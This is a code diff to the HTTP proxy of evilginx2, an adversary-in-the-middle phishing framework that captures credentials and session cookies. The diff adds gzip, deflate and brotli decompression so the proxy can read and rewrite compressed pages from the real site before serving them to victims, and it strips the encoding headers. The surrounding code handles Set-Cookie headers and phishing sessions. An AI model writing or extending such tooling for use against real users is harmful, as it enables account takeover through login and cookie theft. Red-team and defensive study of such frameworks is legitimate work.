@@ -11,6 +11,8 @@ import (
 	"bufio"
 	"bytes"
 	"context"
+	"compress/flate"
+	"compress/gzip"
 	"crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
@@ -41,6 +43,7 @@ import (
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
 	utls "github.com/refraction-networking/utls"
+	"github.com/andybalholm/brotli"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -1133,8 +1136,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
 
+			// Handle decompression
+			var reader io.ReadCloser = resp.Body
+			contentEncoding := strings.ToLower(resp.Header.Get("Content-Encoding"))
+			if contentEncoding == "gzip" {
+				gzReader, err := gzip.NewReader(resp.Body)
+				if err == nil {
+					reader = gzReader
+				} else {
+					log.Error("gzip decompress error: %v", err)
+				}
+			} else if contentEncoding == "deflate" {
+				reader = flate.NewReader(resp.Body)
+			} else if contentEncoding == "br" {
+				reader = ioutil.NopCloser(brotli.NewReader(resp.Body))
+			}
+
 			// modify received body
-			body, err := ioutil.ReadAll(resp.Body)
+			body, err := ioutil.ReadAll(reader)
+			reader.Close()
+			if reader != resp.Body {
+				resp.Body.Close()
+			}
+
+			// We are not re-compressing, so remove the headers
+			resp.Header.Del("Content-Encoding")
+			resp.Header.Del("Content-Length")
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
